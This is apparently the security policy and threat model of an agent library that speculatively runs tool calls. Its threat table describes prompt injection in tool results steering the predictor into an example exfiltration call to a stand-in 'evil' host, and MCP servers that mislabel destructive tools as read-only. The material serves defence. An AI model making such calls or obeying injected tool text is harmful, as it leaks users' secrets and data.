# Security policy and threat model

## Reporting a vulnerability

Please report vulnerabilities privately through GitHub's **"Report a vulnerability"** button (Security → Advisories) on this
repository. Do not open a public issue. You should get an acknowledgement within 5 business days. Fixes are released as patch
versions and noted in [CHANGELOG.md](CHANGELOG.md).

Supported versions: the latest `1.x` release (and release candidates) receive security fixes.

## What speculate-tools does that a normal agent does not

Speculation **executes tool calls the agent did not (yet) decide to make**, with arguments chosen by a predictor, in the
background, and keeps the results in memory. Everything below follows from that.

### Assets

1. **The environment** the tools act on (files, databases, remote APIs). Unintended changes are the worst outcome.
2. **Data returned by tools** (file contents, API responses), which may belong to a specific user or session.
3. **Secrets in tool arguments** (tokens, passwords, personal data passed as args).
4. **Correctness of the agent**: the results it sees must be the ones it would have seen without speculation.
5. **Quotas and money**: rate limits and metered APIs consumed by speculative calls.

### Trust boundaries

- Tool **metadata** (names, descriptions, MCP annotations) may come from a third-party MCP server: **untrusted**.
- Tool **results** can contain attacker-controlled text (web pages, issues, emails): **untrusted**, and they feed the predictors.
- **Predictors** (n-gram, LLM) are steered by that untrusted data: their output is **untrusted**.
- The **tool handlers** and the **Speculator configuration** are trusted (they are your code).

## Threats and mitigations

| # | Threat | Mitigation in the code | Residual risk / what you must do |
|---|--------|------------------------|----------------------------------|
| T1 | **A side-effecting tool runs speculatively** (a predicted `delete_file`, `send_email`, `git push`). | Only classes in `allow` run speculatively (default `read_only`). `side_effecting` is stripped from `allow` even if passed. Unknown and unregistered tools default to `side_effecting`. Every prediction passes the gate in `Speculator.launchAll`; a randomized test with 2,000 hostile predictions checks it. | Classification is only as good as the metadata (T2). Use explicit `classifier.overrides` for anything important. |
| T2 | **Misleading tool metadata**: a server marks `drop_table` with `readOnlyHint: true`, or names a destructive tool `get_data`. | A mutating word in the **name or description** vetoes `readOnlyHint` (whole description scanned). `trustAnnotations: false` ignores annotations; `heuristics: false` ignores names. With both off, only explicit `overrides` can make a tool speculable, i.e. an allowlist. CLI: `--no-trust-annotations --no-heuristics --read-only a,b`. | Heuristics can be evaded (synonyms, homoglyphs, other languages). **For untrusted MCP servers use the allowlist mode.** |
| T3 | **Exfiltration through speculation**: prompt injection in a tool result steers the predictor into a call like `fetch("https://evil/?q=<secret>")`, which the agent itself never makes. | Open-world tools (MCP `openWorldHint: true`, network-ish names like `web_*`/`*_url`/`curl`, or URL-like argument names) are **not speculated** unless `allowOpenWorld` is set. `openWorldByDefault` (`--strict-open-world`) treats a missing hint as open-world, as the MCP spec does. | Read-only tools that reach the network but look local are not detected. The LLM predictor can compose arbitrary argument strings; the n-gram only copies previously seen values. Keep `allowOpenWorld` off unless you trust every input the predictor sees. |
| T4 | **Cache poisoning / stale results**: a speculative read returns data the agent should not see because state changed. | Epoch invalidation before *and* after every non-read-only call (in-flight reads included); validators fingerprint state **before** the speculative run and again at use; mismatch, validator error or validator **timeout** => re-execute. Results that are errors (`acceptResult`, MCP `isError`) are never cached. Served idempotent results also invalidate. Cache keys are exact: canonical JSON with **no** lossy normalization, non-JSON args (Date, Map, NaN, BigInt, cycles) are never cached. | Changes made outside the agent are only caught for state a validator fingerprints. Nondeterministic "read-only" tools (`now()`, `random()`) must not be marked read-only. |
| T5 | **Cross-session leakage**: user A's speculative result is served to user B. | One `Speculator` = one session. `SpeculatorPool` gives every session id its own cache, history, epoch and budget (tested). `ctx.sessionId` is passed to handlers so they can use per-user credentials. | **Never share one `Speculator` between users.** A *shared* learning predictor (one `NGramPredictor` for all sessions) remembers argument values and can *propose* user A's values inside user B's session (B's own credentials are used and the result is only served to B, but the call shows up in B's logs). Use a predictor factory (`predictor: (id) => new NGramPredictor()`) for multi-tenant deployments. |
| T6 | **Secrets in arguments** leak into logs, metrics or memory dumps. | Cache keys are SHA-256 hashes. The logger never receives argument values unless `logArgs: true`. Metrics attributes contain only tool names, outcomes and reasons. The CLI logs to stderr only, args off by default (`--log-args` to enable). | `onEvent` listeners receive full calls (in-process, your code). The LLM predictor sends recent args and truncated results to its model provider; use a local model (`OpenAICompatibleLLMClient` + Ollama/llama.cpp) if that is not acceptable. Speculative results live in memory until used, evicted (`maxAgeMs`, `maxCacheEntries`, `maxCacheBytes`) or `close()`d. |
| T7 | **Resource exhaustion**: unbounded caches, runaway speculation, hanging validators. | `maxCacheEntries` (pending entries included), `maxCacheBytes`, `maxHistory`, n-gram source pruning (`maxSourcesPerArg`), `maxConcurrency` / `maxGlobalConcurrency`, `timeoutMs`, `validatorTimeoutMs`, `budget`. `fsValidator` never opens FIFOs/devices and does not hash files above `maxHashBytes`. | Read-only speculation still consumes CPU, I/O, rate limits and money (about 70–98% of speculative executions are thrown away; see README). Set `budget` for metered tools. |
| T8 | **A bug in a hook or predictor breaks the agent** (crash via unhandled rejection, or a real call reported as failed after it succeeded, leading to a duplicate side effect on retry). | Predictor output is validated; `onEvent`, logger, telemetry, `observe`, `normalizeArgs`, `costOf` errors are caught and counted in `metrics().internalErrors`. Real-call results are never lost because of speculation code (regression tests). | Monitor `internalErrors`; it should stay 0. |

## Deployment checklist

- [ ] One `Speculator` per session, or a `SpeculatorPool` keyed by `user:conversation`.
- [ ] Explicit `classifier.overrides` for your important tools. For third-party MCP servers: `trustAnnotations: false, heuristics: false` plus an allowlist.
- [ ] `allowOpenWorld` stays off unless you have reviewed every input the predictor sees.
- [ ] `idempotent` stays out of `allow` unless you accept that its effect happens even when the agent never asks for it.
- [ ] `budget` set for metered or rate-limited tools.
- [ ] Logs do not enable `logArgs` in production.
- [ ] Validators (`fsValidator`, `customValidator`) for state that can change outside the agent.
